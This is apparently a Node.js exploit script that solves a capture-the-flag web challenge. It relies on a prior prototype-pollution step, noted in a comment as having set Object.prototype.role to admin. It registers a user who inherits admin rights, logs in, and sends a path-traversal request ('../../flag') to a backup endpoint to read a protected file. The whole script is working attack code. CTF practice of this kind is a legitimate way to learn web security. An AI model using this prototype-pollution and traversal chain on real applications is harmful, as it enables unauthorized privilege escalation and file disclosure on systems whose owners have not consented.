
const http = require('http');
const querystring = require('querystring');

// We already have Object.prototype.role = admin from previous poisoning
// Just register new user, get uid, request flag
console.log("Registering new user... (will inherit role=admin from prototype)");

const postData = querystring.stringify({
  "username": "getflagnow"
});

const opts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = http.request(opts, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    const match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
    if (match) {
      const uid = match[1];
      console.log(`Got uid: ${uid}, logging in...`);
      loginAndGetFlag(uid);
    } else {
      console.log("Failed to get UID");
      console.log(body);
    }
  });
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();

function loginAndGetFlag(uid) {
  const querystring = require('querystring');
  const loginData = querystring.stringify({uid: uid});
  const loginOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(loginData)
    }
  };

  const req = http.request(loginOpts, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    console.log("Logged in, getting flag...");
    const flagData = querystring.stringify({file: '../../flag'});
    const flagOpts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/api/backup',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(flagData),
        'Cookie': cookie
      }
    };

    const flagReq = http.request(flagOpts, (flagRes) => {
      let flagBody = '';
      flagRes.on('data', chunk => flagBody += chunk);
      flagRes.on('end', () => {
        console.log("\n\n🏁 🏁 🏁 FINAL FLAG:");
        console.log(flagBody);
      });
    });
    flagReq.write(flagData);
    flagReq.end();
  });

  req.on('error', err => console.error(err));
  req.write(loginData);
  req.end();
}
